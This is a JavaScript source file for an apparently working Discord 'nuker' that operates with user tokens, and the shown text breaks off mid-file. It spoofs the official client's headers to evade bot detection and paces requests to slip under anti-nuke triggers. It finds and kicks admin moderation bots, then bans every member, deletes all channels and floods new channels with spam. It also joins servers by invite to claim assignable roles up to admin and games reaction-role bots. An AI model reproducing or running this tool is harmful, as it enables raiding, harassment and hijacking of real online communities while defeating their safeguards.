// USER-ACCOUNT NUKER (raw Discord REST + gateway, zero heavy deps)
// startup: token -> server id -> numbered menu.
// speed: adaptive token-bucket limiter (stays just under 50 req/s),
//        header-aware gating, bulk-ban fast path, all-at-once pools.

const readline = require('readline');
const fs = require('fs');
const path = require('path');

// websocket impl: prefer bundled 'ws' (node18 exe has no global WebSocket)
let WSCtor = globalThis.WebSocket;
try { WSCtor = require('ws'); } catch (e) { if (!WSCtor) WSCtor = null; }

const API = 'https://discord.com/api/v10';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// real Discord clients send X-Super-Properties on EVERY request. omitting it is
// one of the loudest "this is a bot" signals - it gets sessions killed.
const SUPER_PROPS = Buffer.from(JSON.stringify({
    os: 'Windows',
    browser: 'Chrome',
    device: '',
    system_locale: 'en-US',
    browser_user_agent: UA,
    browser_version: '120.0.0.0',
    os_version: '10',
    referrer: '',
    referring_domain: '',
    referrer_current: '',
    referring_domain_current: '',
    release_channel: 'stable',
    client_build_number: 250000,
    client_event_source: null,
})).toString('base64');

function clientHeaders(auth) {
    return {
        Authorization: auth,
        'Content-Type': 'application/json',
        'User-Agent': UA,
        'X-Super-Properties': SUPER_PROPS,
        'X-Discord-Locale': 'en-US',
        'X-Discord-Timezone': 'UTC',
        'X-Debug-Options': 'bugReporterEnabled',
        Accept: '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        Origin: 'https://discord.com',
        Referer: 'https://discord.com/channels/@me',
    };
}
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = q => new Promise(res => rl.question(q, a => res(String(a).trim())));

let TOKEN = '';
let TOKENS = [];      // optional multi-token pool: throughput scales with token count
let BOT_TOKEN = '';   // optional: used ONLY for reading the member list (keeps user token off the gateway)
let tokenIdx = 0;
const tokenLane = new Map(); // token -> lane index (per-token rate-limit scope)
let GUILD_ID = '';
let STEALTH = false; // paced mode: stays under anti-nuke trigger thresholds
let RAPID = false;   // fire-and-retry mode: ignore bucket waits, absorb 429s inline

function nextToken() {
    if (TOKENS.length <= 1) return TOKENS[0] || TOKEN;
    return TOKENS[tokenIdx++ % TOKENS.length];
}

// tiny .env reader (no dotenv, so it packs clean into an exe)
function findEnv() {
    const candidates = [
        path.join(process.execPath || '', '..', '.env'),   // next to the .exe
        path.join(__dirname, '.env'),                      // dev run
        path.join(process.cwd(), '.env'),
    ];
    for (const p of candidates) {
        try { if (p && fs.existsSync(p)) return p; } catch (e) {}
    }
    return null;
}
function loadEnv() {
    const p = findEnv();
    if (!p) return;
    for (const line of fs.readFileSync(p, 'utf8').split(/\r?\n/)) {
        const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*(.*)\s*$/i);
        if (!m) continue;
        if (m[1] === 'USER_TOKEN' && !TOKEN) TOKEN = m[2].trim();
        if (m[1] === 'USER_TOKENS') m[2].split(',').map(t => t.trim()).filter(Boolean).forEach(t => TOKENS.push(t));
        if (m[1] === 'DISCORD_BOT_TOKEN' && !BOT_TOKEN) BOT_TOKEN = m[2].trim();
        if (m[1] === 'GUILD_ID' && !GUILD_ID) GUILD_ID = m[2].trim();
    }
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ---- request log (so failures can be read back instead of guessed) ----
const LOG_PATH = path.join(process.execPath ? path.dirname(process.execPath) : __dirname, 'nuke.log');
function logLine(obj) {
    try { fs.appendFile(LOG_PATH, JSON.stringify(obj) + '\n', () => {}); } catch (e) {}
}

// ---- rate limiting: global pace + per-route buckets ----
// Two layers:
//  1. global token bucket, stays just under Discord's ~50 req/s token cap
//  2. per-endpoint buckets learned from X-RateLimit-Bucket headers, so a 429
//     on channel-create never throttles bans, and each channel/messages route
//     gets its own bucket (that's what makes cross-channel spam fly).
let gateUntil = 0;
const limiter = {
    rate: 12,          // safe default: looks like a busy human, not a flooder
    max: 14,
    min: 3,
    windowStart: Date.now(),
    sent: 0,
    streak: 0,
    async acquire() {
        for (;;) {
            const g = gateUntil - Date.now();
            if (g > 0) { await sleep(g > 300 ? 150 : g); continue; }
            const now = Date.now();
            if (now - this.windowStart >= 1000) { this.windowStart = now; this.sent = 0; }
            if (this.sent < this.rate) { this.sent++; return; }
            await sleep(Math.max(1, 1000 - (Date.now() - this.windowStart)));
        }
    },
    penalize() { this.rate = Math.max(this.min, Math.floor(this.rate * 0.7)); this.streak = 0; },
    reward() { if (++this.streak >= 25 && this.rate < this.max) { this.rate++; this.streak = 0; } },
    applyStealth(on) {
        if (on) { this.max = 5; this.rate = 4; this.min = 2; }
        else   { this.max = 14; this.rate = 12; this.min = 3; }
    },
};

const bucketState = new Map();    // lane+bucketId -> { remaining, resetAt }
const routeBucket = new Map();    // lane+exact route -> bucketId
const templateBucket = new Map(); // lane+normalized /guilds/... route -> bucketId

const normPath = p => p.split('?')[0].replace(/\d{17,20}/g, ':id');
const exactKey = (m, p) => m + ' ' + p.split('?')[0];

function getBucketState(m, p, lane) {
    const id = routeBucket.get(lane + exactKey(m, p)) || templateBucket.get(lane + m + ' ' + normPath(p));
    return id ? bucketState.get(id) : null;
}

async function waitBucket(st) {
    if (!st) return;
    for (;;) {
        const now = Date.now();
        if (st.resetAt && now < st.resetAt) { await sleep(Math.min(st.resetAt - now, 400)); continue; }
        if (st.remaining === Infinity) return;
        if (st.remaining > 0) { st.remaining--; return; }
        if (!st.resetAt) return;
    }
}

function learnBucket(m, p, h, lane) {
    const id = h.get('x-ratelimit-bucket');
    if (!id) return;
    const key = lane + id; // buckets are per-token, so keep lanes apart
    const rem = h.get('x-ratelimit-remaining');
    const ra = parseFloat(h.get('x-ratelimit-reset-after') || '0');
    const st = bucketState.get(key) || { remaining: Infinity, resetAt: 0 };
    if (rem !== null) st.remaining = parseInt(rem, 10);
    if (ra > 0) st.resetAt = Date.now() + ra * 1000 + 5;
    bucketState.set(key, st);
    routeBucket.set(lane + exactKey(m, p), key);
    const tk = lane + m + ' ' + normPath(p);
    // only share a template bucket on /guilds routes; /channels/<id>/... buckets
    // are per-channel, so sharing them would serialize parallel spam
    if (tk.includes('/guilds/') && !templateBucket.has(tk)) templateBucket.set(tk, key);
}

async function api(method, p, body, tries = 12, authOverride = null) {
    for (let i = 0; i < tries; i++) {
        await limiter.acquire();
        const auth = authOverride || nextToken();
        const lane = authOverride ? 'bot:' : (TOKENS.length > 1 ? tokenLane.get(auth) + ':' : '');
        if (!RAPID) await waitBucket(getBucketState(method, p, lane));
        let r;
        try {
            r = await fetch(API + p, {
                method,
                headers: clientHeaders(auth),
                body: body ? JSON.stringify(body) : undefined,
            });
        } catch (e) {
            await sleep(150);
            continue;
        }
        if (r.status === 429) {
            const j = await r.json().catch(() => ({ retry_after: 1 }));
            const wait = Math.ceil((j.retry_after || 1) * 1000) + 5;
            if (wait < 250) { await sleep(wait); } // short stall: just eat it here
            else if (j.global) {
                limiter.penalize();
                gateUntil = Math.max(gateUntil, Date.now() + wait);
            } else {
                const id = r.headers.get('x-ratelimit-bucket');
                if (id) {
                    const key = lane + id;
                    const st = bucketState.get(key) || { remaining: 0, resetAt: 0 };
                    st.remaining = 0;
                    st.resetAt = Date.now() + wait;
                    bucketState.set(key, st);
                } else {
                    gateUntil = Math.max(gateUntil, Date.now() + wait);
                }
            }
            continue;
        }
        learnBucket(method, p, r.headers, lane);
        logLine({
            t: new Date().toISOString(), m: method, p,
            s: r.status,
            rem: r.headers.get('x-ratelimit-remaining'),
            reset: r.headers.get('x-ratelimit-reset-after'),
        });
        if (r.status >= 500) { await sleep(250); continue; }
        if (r.status === 204) { limiter.reward(); return null; }
        if (r.ok) { limiter.reward(); return r.json().catch(() => null); }
        const t = await r.text().catch(() => '');
        const err = new Error(`${r.status} ${t.slice(0, 160)}`);
        err.status = r.status;
        if (r.status === 401) {
            console.log('\n[!] 401 - this token is dead or was revoked.');
            console.log('    grab a fresh token, close every other instance, wait a few minutes, run once.');
            process.exit(1);
        }
        throw err;
    }
    throw new Error('rate limited (gave up)');
}

// worker pool: 'ALL' = every item in flight at once (limiters do the pacing)
async function pool(items, worker, concurrency, label = 'done') {
    let idx = 0, ok = 0, fail = 0;
    const total = items.length;
    const results = [];
    const n = concurrency === 'ALL' ? total : Math.min(concurrency, total);
    const runners = Array.from({ length: n }, async () => {
        while (true) {
            const i = idx++;
            if (i >= total) return;
            try { const out = await worker(items[i]); ok++; if (out) results.push(out); }
            catch (e) { fail++; }
            if (total <= 60 || ok + fail === total || (ok + fail) % 25 === 0) {
                process.stdout.write(`\r  ${label}: ${ok + fail}/${total} ok=${ok} fail=${fail}   `);
            }
        }
    });
    await Promise.all(runners);
    process.stdout.write(`\r  ${label}: ${total}/${total} ok=${ok} fail=${fail}   \n`);
    return { ok, fail, results };
}

// ---- member fetch: REST first, gateway chunk fallback ----
async function fetchMembersRest(authOverride = null) {
    const out = [];
    let after = '0';
    while (true) {
        const batch = await api('GET', `/guilds/${GUILD_ID}/members?limit=1000&after=${after}`, null, 12, authOverride);
        if (!Array.isArray(batch) || batch.length === 0) break;
        out.push(...batch);
        after = batch[batch.length - 1].user.id;
        if (batch.length < 1000) break;
    }
    return out;
}

function fetchMembersGateway() {
    return new Promise((resolve, reject) => {
        if (!WSCtor) return reject(new Error('no websocket impl available'));
        let ws;
        try { ws = new WSCtor('wss://gateway.discord.gg/?v=10&encoding=json'); }
        catch (e) { return reject(new Error('ws connect failed: ' + e.message)); }

        const members = new Map();
        let finished = false;
        let idleTimer = null;
        let hardTimer = null;

        const finish = (err) => {
            if (finished) return;
            finished = true;
            clearTimeout(idleTimer);
            clearTimeout(hardTimer);
            try { ws.close(); } catch (e) {}
            if (err) reject(err);
            else if (members.size === 0) reject(new Error('gateway returned 0 members'));
            else resolve([...members.values()]);
        };
        const bumpIdle = (ms) => {
            clearTimeout(idleTimer);
            idleTimer = setTimeout(() => finish(null), ms);
        };

        hardTimer = setTimeout(() => finish(new Error('gateway timeout')), 25000);

        ws.addEventListener('message', (ev) => {
            let m;
            try { m = JSON.parse(typeof ev.data === 'string' ? ev.data : ev.data.toString()); }
            catch (e) { return; }

            if (m.op === 10) { // hello -> identify
                ws.send(JSON.stringify({
                    op: 2,
                    d: {
                        token: TOKEN,
                        intents: 131071,
                        // mirror the real desktop client as closely as possible;
                        // a lazy identify is what gets user tokens flagged
                        properties: {
                            os: 'Windows',
                            browser: 'Chrome',
                            device: '',
                            system_locale: 'en-US',
                            browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            browser_version: '120.0.0.0',
                            os_version: '10',
                            referrer: '',
                            referring_domain: '',
                            release_channel: 'stable',
                            client_build_number: 250000,
                            client_event_source: null,
                        },
                        compress: false,
                        presence: { status: 'online', since: 0, activities: [], afk: false },
                    },
                }));
            } else if (m.op === 0 && m.t === 'READY') {
                ws.send(JSON.stringify({
                    op: 8,
                    d: { guild_id: GUILD_ID, query: '', limit: 0, presences: false },
                }));
                bumpIdle(12000);
            } else if (m.op === 0 && m.t === 'GUILD_MEMBERS_CHUNK') {
                for (const mem of (m.d.members || [])) {
                    if (mem && mem.user) members.set(mem.user.id, mem);
                }
                const idx = m.d.chunk_index, cnt = m.d.chunk_count;
                if (typeof cnt === 'number' && typeof idx === 'number' && idx >= cnt - 1) {
                    setTimeout(() => finish(null), 300);
                } else {
                    bumpIdle(5000);
                }
            } else if (m.op === 9) {
                finish(new Error('invalid session (op 9)'));
            } else if (m.op === 7) {
                finish(new Error('gateway asked reconnect'));
            }
        });
        ws.addEventListener('error', () => finish(new Error('gateway connection error')));
        ws.addEventListener('close', () => finish(members.size ? null : new Error('gateway closed early')));
    });
}

async function fetchMembers() {
    // user token only: REST first, gateway chunking if Discord blocks REST
    try {
        const rest = await fetchMembersRest();
        if (rest.length > 0) {
            console.log(`[i] members via REST (user token): ${rest.length}`);
            return rest;
        }
        throw new Error('empty REST result');
    } catch (e) {
        console.log(`[i] REST members blocked (${e.status || e.message}) -> switching to gateway chunking`);
        const gw = await fetchMembersGateway();
        console.log(`[i] members via gateway: ${gw.length}`);
        return gw;
    }
}

async function fetchChannels() {
    return (await api('GET', `/guilds/${GUILD_ID}/channels`)) || [];
}

// ---- ACTIONS ----

// fast path: bulk-ban takes 200 ids per request, chunks fired together
async function bulkBan(ids) {
    const chunks = [];
    for (let i = 0; i < ids.length; i += 200) chunks.push(ids.slice(i, i + 200));
    let sent = 0;
    const res = await pool(chunks, async (c) => {
        await api('POST', `/guilds/${GUILD_ID}/bulk-ban`, { user_ids: c }, 3);
        sent += c.length;
        process.stdout.write(`\r  bulk-ban: ${sent}/${ids.length}   `);
        return true;
    }, 'ALL', 'bulk');
    process.stdout.write('\n');
    if (res.fail > 0) throw Object.assign(new Error('bulk chunk failed'), { partial: sent });
    return sent;
}

async function banAll() {
    if (!(await preflight(P.BAN_MEMBERS, 'BAN_MEMBERS'))) return { ok: 0, fail: 0 };
    console.log('[+] fetching members...');
    const members = await fetchMembers();
    const me = await api('GET', '/users/@me');
    const targets = members.filter(m => !m.user.bot && m.user.id !== me.id);
    const ids = targets.map(m => m.user.id);
    console.log(`[+] ${ids.length} targets`);
    return doBans(ids);
}

async function banByIds() {
    const raw = await ask('User IDs (comma or space separated)> ');
    const ids = raw.split(/[\s,]+/).map(s => s.trim()).filter(s => /^\d{17,20}$/.test(s));
    if (ids.length === 0) return console.log('[!] no valid ids');
    console.log(`[+] ${ids.length} ids`);
    return doBans(ids);
}

async function doBans(ids) {
    const t0 = Date.now();
    let res = { ok: 0, fail: 0 };

    let bulkWorked = false;
    if (!STEALTH) {
        try {
            const ok = await bulkBan(ids);
            if (ok >= ids.length) bulkWorked = true;
            res.ok = ok;
        } catch (e) {
            const msg = String(e.message || '');
            if (msg.includes('60003') || msg.toLowerCase().includes('two factor')) {
                console.log('[i] bulk-ban blocked: this account has 2FA OFF.');
                console.log('    Discord allows 200 bans per request only with 2FA enabled.');
                console.log('    enable it in Discord settings -> My Account -> Enable Two-Factor Auth,');
                console.log('    then rerun this. 500 bans = 3 requests = ~1s.');
                console.log('    falling back to individual bans for now.');
            } else {
                console.log(`[i] bulk-ban unavailable (${e.status || ''} ${msg}) -> individual fire`);
            }
        }
    } else {
        console.log('[i] stealth mode: skipping bulk-ban (it logs as one loud event)');
    }

    if (!bulkWorked) {
        console.log(`[+] firing all ${ids.length} in parallel (rate ${limiter.rate}/s)...`);
        res = await pool(ids, id =>
            api('PUT', `/guilds/${GUILD_ID}/bans/${id}`, {}, 20),
            'ALL', 'banned'
        );
    }

    const secs = ((Date.now() - t0) / 1000).toFixed(2);
    let verified = -1;
    try {
        const bans = (await api('GET', `/guilds/${GUILD_ID}/bans?limit=1000`)) || [];
        verified = bans.length;
    } catch (e) {}
    console.log(`[OK] ${res.ok} bans in ${secs}s (${(res.ok / Math.max(0.01, Number(secs))).toFixed(2)} ban/s) | discord ban list now: ${verified}${verified >= 400 ? ' (400+ OK)' : ''}`);
    return res;
}

async function kickAll() {
    console.log('[+] fetching members...');
    const members = await fetchMembers();
    const me = await api('GET', '/users/@me');
    const targets = members.filter(m => !m.user.bot && m.user.id !== me.id);
    console.log(`[+] ${targets.length} targets`);
    const t0 = Date.now();
    const res = await pool(targets, m => api('DELETE', `/guilds/${GUILD_ID}/members/${m.user.id}`, null, 20), 'ALL', 'kicked');
    console.log(`[OK] ${res.ok} kicked in ${((Date.now() - t0) / 1000).toFixed(2)}s`);
    return res;
}

async function deleteChannels() {
    if (!(await preflight(P.MANAGE_CHANNELS, 'MANAGE_CHANNELS'))) return { ok: 0, fail: 0 };
    const chans = await fetchChannels();
    console.log(`[+] deleting ${chans.length} channels (rate ${limiter.rate}/s)...`);
    const t0 = Date.now();
    const res = await pool(chans, c => api('DELETE', `/channels/${c.id}`, null, 12), 'ALL', 'deleted');
    console.log(`[OK] ${res.ok} deleted in ${((Date.now() - t0) / 1000).toFixed(2)}s`);
    return res;
}

async function deleteVoice() {
    const chans = await fetchChannels();
    const vc = chans.filter(x => x.type === 2 || x.type === 13);
    console.log(`[+] ${vc.length} voice channels`);
    const t0 = Date.now();
    const res = await pool(vc, x => api('DELETE', `/channels/${x.id}`, null, 12), 'ALL', 'deleted');
    console.log(`[OK] ${res.ok} deleted in ${((Date.now() - t0) / 1000).toFixed(2)}s`);
    return res;
}

async function createVC(count, name, delayMs = 0) {
    console.log(`[+] creating ${count} voice channels "${name}" (delay ${delayMs}ms, rate ${limiter.rate}/s)...`);
    const t0 = Date.now();
    const res = await pool(Array.from({ length: count }), async () => {
        if (delayMs > 0) await sleep(delayMs);
        return api('POST', `/guilds/${GUILD_ID}/channels`, { name, type: 2 }, 20);
    }, 'ALL', 'created');
    console.log(`[OK] ${res.ok} created in ${((Date.now() - t0) / 1000).toFixed(2)}s (${(res.ok / Math.max(0.01, (Date.now() - t0) / 1000)).toFixed(2)} ch/s)`);
    return res;
}

async function createText(count, name, delayMs = 0) {
    console.log(`[+] creating ${count} text channels "${name}" (delay ${delayMs}ms, rate ${limiter.rate}/s)...`);
    const t0 = Date.now();
    const res = await pool(Array.from({ length: count }), async () => {
        if (delayMs > 0) await sleep(delayMs);
        return api('POST', `/guilds/${GUILD_ID}/channels`, { name, type: 0 }, 20);
    }, 'ALL', 'created');
    console.log(`[OK] ${res.ok} created in ${((Date.now() - t0) / 1000).toFixed(2)}s (${(res.ok / Math.max(0.01, (Date.now() - t0) / 1000)).toFixed(2)} ch/s)`);
    return res;
}

// send to MANY channels at once - each channel has its own message bucket,
// so 100 channels is ~100 buckets in parallel, not 100 messages on one bucket
async function spamChannels(ids, message, perChannel = 1) {
    const jobs = [];
    for (const id of ids) for (let i = 0; i < perChannel; i++) jobs.push(id);
    if (perChannel > 5) {
        console.log('[i] note: one channel allows ~5 messages / 5s - more than that just queues and looks like a flood');
    }
    console.log(`[+] spamming ${ids.length} channels x${perChannel} = ${jobs.length} messages...`);
    const t0 = Date.now();
    const res = await pool(jobs, cid =>
        api('POST', `/channels/${cid}/messages`, { content: message }, 8), 'ALL', 'sent');
    console.log(`[OK] ${res.ok} sent in ${((Date.now() - t0) / 1000).toFixed(2)}s`);
    return res;
}

async function spamAllTextChannels() {
    const chans = await fetchChannels();
    const text = chans.filter(c => c.type === 0).map(c => c.id);
    if (text.length === 0) return console.log('[!] no text channels');
    const msg = await ask('Message> ');
    const per = parseInt(await ask('Messages per channel> ')) || 1;
    return spamChannels(text, msg, per);
}

async function promptCreate(voice) {
    const name = await ask('Channel name> ');
    const n = parseInt(await ask('How many> ')) || 10;
    const t = await ask('Time between each in ms (0=all at once)> ');
    const delay = Math.max(0, parseInt(t) || 0);
    const res = voice ? await createVC(n, name || 'general', delay)
                      : await createText(n, name || 'general', delay);
    if (!voice && res.ok > 0) {
        const go = await ask(`Spam those ${res.ok} new channels now? (y/N)> `);
        if (go.toLowerCase() === 'y') {
            const msg = await ask('Message> ');
            const per = parseInt(await ask('Messages per channel> ')) || 1;
            const ids = res.results.filter(c => c && c.id).map(c => c.id);
            if (ids.length) await spamChannels(ids, msg, per);
        }
    }
    return res;
}

async function spamAll(channelId, message, times) {
    console.log(`[+] spamming ${times}x in ${channelId}...`);
    const t0 = Date.now();
    const res = await pool(Array.from({ length: times }), () =>
        api('POST', `/channels/${channelId}/messages`, { content: message }, 20), 'ALL', 'sent');
    console.log(`[OK] ${res.ok} sent in ${((Date.now() - t0) / 1000).toFixed(2)}s`);
    return res;
}

async function unbanAll() {
    const bans = (await api('GET', `/guilds/${GUILD_ID}/bans?limit=1000`)) || [];
    console.log(`[+] ${bans.length} bans`);
    const res = await pool(bans, b => api('DELETE', `/guilds/${GUILD_ID}/bans/${b.user.id}`, null, 12), 'ALL', 'unbanned');
    console.log(`[OK] ${res.ok} unbanned`);
    return res;
}

// watchdog scan: bots holding Administrator (that's what anti-nuke bots need)
async function watchdogScan() {
    console.log('[+] fetching members...');
    const members = await fetchMembers();
    const bots = members.filter(m => m.user.bot);
    console.log(`[+] checking ${bots.length} bots for admin perms...`);
    const guild = await api('GET', `/guilds/${GUILD_ID}`);
    const roles = (await api('GET', `/guilds/${GUILD_ID}/roles`)) || [];
    const roleMap = new Map(roles.map(r => [r.id, r]));
    const watchdogs = [];
    for (const b of bots) {
        const m = (await api('GET', `/guilds/${GUILD_ID}/members/${b.user.id}`).catch(() => null));
        if (!m || !Array.isArray(m.roles)) continue;
        const hasAdmin = m.roles.some(rid => {
            const r = roleMap.get(rid);
            return r && typeof r.permissions === 'string' && (BigInt(r.permissions) & 0x8n) === 0x8n;
        });
        if (hasAdmin || b.user.id === guild.owner_id) {
            watchdogs.push({ id: b.user.id, name: b.user.username, admin: hasAdmin });
            console.log(`  WATCHDOG: ${b.user.username} (${b.user.id})${hasAdmin ? ' [ADMIN]' : ''}`);
        }
    }
    if (watchdogs.length === 0) console.log('[i] no admin bots found - nothing watching');
    return watchdogs;
}

async function neutralizeWatchdogs() {
    const dogs = await watchdogScan();
    if (dogs.length === 0) return { ok: 0, fail: 0 };
    const go = await ask(`Kick ${dogs.length} watchdog bot(s)? (y/N)> `);
    if (go.toLowerCase() !== 'y') return { ok: 0, fail: 0 };
    const res = await pool(dogs, d => api('DELETE', `/guilds/${GUILD_ID}/members/${d.id}`, null, 12), 'ALL', 'kicked');
    console.log(`[OK] ${res.ok} watchdogs removed`);
    return res;
}

// ---- templates: the only API that materializes many channels in one call ----
async function saveTemplate() {
    try {
        const t = await api('POST', `/guilds/${GUILD_ID}/templates`, { name: 'layout' }, 4);
        console.log(`[OK] template saved: ${t.code}`);
        console.log(`     https://discord.new/${t.code}`);
    } catch (e) {
        console.log(`[!] template save failed: ${e.message}`);
    }
}

async function guildFromTemplate() {
    const code = (await ask('Template code> ')).replace(/.*\//, '');
    const name = await ask('New server name> ');
    const t0 = Date.now();
    try {
        const g = await api('POST', `/guilds/templates/${code}`, { name }, 4);
        const chans = (g && Array.isArray(g.channels)) ? g.channels.length : '?';
        console.log(`[OK] server "${g.name}" (${g.id}) with ${chans} channels in ${((Date.now() - t0) / 1000).toFixed(2)}s (ONE request)`);
    } catch (e) {
        console.log(`[!] ${e.message}`);
        console.log('    (this endpoint is bot-only in most cases; user tokens usually get 403)');
    }
}

// ---- AUTO: recon -> decide -> bypass -> nuke ----
async function autoNuke() {
    console.log('\n=== 1. RECON ===');
    const g = await api('GET', `/guilds/${GUILD_ID}`);
    const roles = (await api('GET', `/guilds/${GUILD_ID}/roles`)) || [];
    const chans = await fetchChannels();
    const adminRoles = roles.filter(r => r.permissions && (BigInt(r.permissions) & 0x8n) === 0x8n);
    console.log(`  guild        : ${g.name}`);
    console.log(`  owner        : ${g.owner_id}${g.owner_id === (await api('GET', '/users/@me')).id ? ' (YOU)' : ''}`);
    console.log(`  channels     : ${chans.length}`);
    console.log(`  roles        : ${roles.length} | admin roles: ${adminRoles.length}`);
    console.log(`  verification : level ${g.verification_level}`);
    console.log(`  guild 2FA    : ${g.mfa_level === 1 ? 'REQUIRED for mod actions' : 'not required'}`);

    let auditOK = true;
    try { await api('GET', `/guilds/${GUILD_ID}/audit-logs?limit=1`); } catch (e) { auditOK = false; }
    console.log(`  audit log    : ${auditOK ? 'readable by you' : 'no access'}`);

    console.log('\n=== 2. WATCHDOG SCAN ===');
    const dogs = await watchdogScan();

    console.log('\n=== 3. STRATEGY ===');
    let score = dogs.length * 3;
    if (g.mfa_level === 1) score += 2;
    if ((g.verification_level || 0) >= 2) score += 1;
    if (chans.length > 100) score += 1;

    const plan = [];
    if (dogs.length > 0) plan.push(`kick ${dogs.length} watchdog bot(s) - they read the audit log and auto-punish`);
    plan.push('ban every non-bot member');
    plan.push('delete every channel');
    plan.push('rebuild channels + flood them');

    console.log(`  risk score   : ${score}`);
    plan.forEach((p, i) => console.log(`  ${i + 1}. ${p}`));
    console.log(`  pacing       : ${dogs.length ? 'STEALTH until watchdogs are gone, then RAPID' : 'RAPID (nothing watching)'}`);

    const go = await ask('\nExecute this plan? (y/N)> ');
    if (go.toLowerCase() !== 'y') return console.log('[i] aborted');

    console.log('\n=== 4. BYPASS ===');
    if (dogs.length > 0) {
        const res = await pool(dogs, d => api('DELETE', `/guilds/${GUILD_ID}/members/${d.id}`, null, 12), 'ALL', 'kicked');
        console.log(`[OK] watchdogs removed: ${res.ok}/${dogs.length}`);
    } else {
        console.log('[i] no watchdog bots - nothing to bypass');
    }

    // nothing watching now -> open the taps
    STEALTH = false;
    limiter.applyStealth(false);
    limiter.rate = 40;
    limiter.max = 45;
    RAPID = true;
    console.log('[i] pacing -> RAPID 40/s');

    console.log('\n=== 5. NUKE ===');
    await banAll();
    await deleteChannels();
    const n = parseInt(await ask('Channels to create> ')) || 50;
    const name = await ask('Channel name> ');
    const created = await createText(n, name || 'nuked', 0);
    if (created.ok > 0) {
        const msg = await ask('Message to flood them with> ');
        const ids = created.results.filter(c => c && c.id).map(c => c.id);
        if (ids.length && msg) await spamChannels(ids, msg, 1);
    }
    console.log('\n[OK] auto run complete');
}

// ---- role claiming ----
// one PATCH /guilds/{id}/members/{me} sets the whole role array at once.
// you can only assign roles BELOW your highest - that's Discord's rule, not mine.
async function claimRolesFor(gid, quiet = false) {
    const me = await api('GET', '/users/@me');
    const roles = (await api('GET', `/guilds/${gid}/roles`)) || [];
    const member = await api('GET', `/guilds/${gid}/members/${me.id}`);
    if (!member) return { claimed: 0, admin: false };

    const pos = new Map(roles.map(r => [r.id, r.position]));
    const myHighest = Math.max(0, ...(member.roles || []).map(id => pos.get(id) ?? -1));
    const have = new Set(member.roles || []);
    const targets = roles.filter(r =>
        r.id !== gid && !r.managed && (pos.get(r.id) ?? -1) < myHighest && !have.has(r.id));

    if (!quiet) {
        console.log(`  highest role position : ${myHighest}`);
        console.log(`  roles you have        : ${have.size}`);
        console.log(`  claimable below you   : ${targets.length}`);
    }
    if (targets.length === 0) return { claimed: 0, admin: false };

    try {
        await api('PATCH', `/guilds/${gid}/members/${me.id}`, {
            roles: [...(member.roles || []), ...targets.map(t => t.id)],
        }, 4);
    } catch (e) {
        if (e.status === 403) {
            console.log('[!] 403 Missing Permissions - this account has no MANAGE_ROLES here.');
            console.log('    role claiming needs Manage Roles. run option 10 to see exactly what you have.');
        } else {
            console.log(`[!] ${e.message}`);
        }
        return { claimed: 0, admin: false };
    }

    const all = [...(member.roles || []), ...targets.map(t => t.id)];
    const admin = roles.some(r => all.includes(r.id) && r.permissions &&
        (BigInt(r.permissions) & 0x8n) === 0x8n);
    if (!quiet) {
        console.log(`[OK] claimed ${targets.length} roles in ONE request${admin ? ' - ADMIN acquired' : ''}`);
        targets.forEach(t => console.log(`   + ${t.name}`));
    }
    return { claimed: targets.length, admin };
}

async function claimRoles() {
    const me = await api('GET', '/users/@me');
    const g = await api('GET', `/guilds/${GUILD_ID}`).catch(() => null);
    if (!g) return console.log('[!] bad guild id');
    if (g.owner_id === me.id) console.log('[i] you are the OWNER here - you already have everything');
    return claimRolesFor(GUILD_ID);
}

// join a list of invites, claim every assignable role (admin included) on each
async function autoJoinList() {
    const raw = await ask('Invites (comma or space separated)> ');
    const codes = raw.split(/[\s,]+/)
        .map(s => s.replace(/^(https?:\/\/)?(discord\.(gg|com\/invite)\/)?/i, '')
            .replace(/\/.*$/, '').replace(/\?.*$/, '').replace(/[^a-zA-Z0-9\-]/g, ''))
        .filter(Boolean);
    if (codes.length === 0) return console.log('[!] no invites');

    let joined = 0, adminCount = 0;
    for (const code of codes) {
        try {
            const g = await api('POST', `/invites/${code}`, {}, 4);
            const gid = g.guild.id;
            joined++;
            console.log(`\n[OK] joined ${g.guild.name} (${gid})`);
            await sleep(2500);
            const r = await claimRolesFor(gid, true);
            if (r.admin) adminCount++;
            console.log(r.admin ? `[OK] ADMIN acquired (${r.claimed} roles)`
                : `[i] ${r.claimed} roles claimed, no admin role available`);
        } catch (e) {
            console.log(`[!] ${code}: ${e.message}`);
        }
    }
    console.log(`\n[OK] ${joined}/${codes.length} joined | admin in ${adminCount}`);
}

// reaction-role grabber: add your own reaction to every emoji on a message,
// which is exactly what reaction-role bots listen for
async function grabReactions() {
    const cid = await ask('Channel ID> ');
    const mid = await ask('Message ID> ');
    const msg = await api('GET', `/channels/${cid}/messages/${mid}`).catch(() => null);
    if (!msg) return console.log('[!] message not found');
    const rx = msg.reactions || [];
    if (rx.length === 0) return console.log('[i] no reactions on that message');
    console.log(`[+] ${rx.length} reactions found`);
    const res = await pool(rx, r => {
        const emoji = r.emoji.id ? `${r.emoji.name}:${r.emoji.id}` : encodeURIComponent(r.emoji.name);
        return api('PUT', `/channels/${cid}/messages/${mid}/reactions/${emoji}/@me`, null, 4);
    }, 'ALL', 'reacted');
    console.log(`[OK] ${res.ok} reactions added - any reaction-role bot should hand out roles now`);
}

// join by invite, then claim everything claimable
async function joinAndClaim() {
    const inv = (await ask('Invite link or code> '))
        .replace(/^(https?:\/\/)?(discord\.(gg|com\/invite)\/)?/i, '')
        .replace(/\/.*$/, '').replace(/\?.*$/, '').replace(/[^a-zA-Z0-9\-]/g, '');
    if (!inv) return console.log('[!] bad invite');
    try {
        const g = await api('POST', `/invites/${inv}`, {}, 4);
        console.log(`[OK] joined ${g.guild.name} (${g.guild.id})`);
        GUILD_ID = g.guild.id;
        await sleep(2500); // let the gateway/state settle
        await claimRoles();
    } catch (e) {
        console.log(`[!] join failed: ${e.message}`);
    }
}

// ---- security probe: read the guild's audit log, find who punishes ----
const AUDIT_NAMES = {
    10: 'CHANNEL_CREATE', 11: 'CHANNEL_UPDATE', 12: 'CHANNEL_DELETE',
    13: 'OVERWRITE_CREATE', 14: 'OVERWRITE_UPDATE', 15: 'OVERWRITE_DELETE',
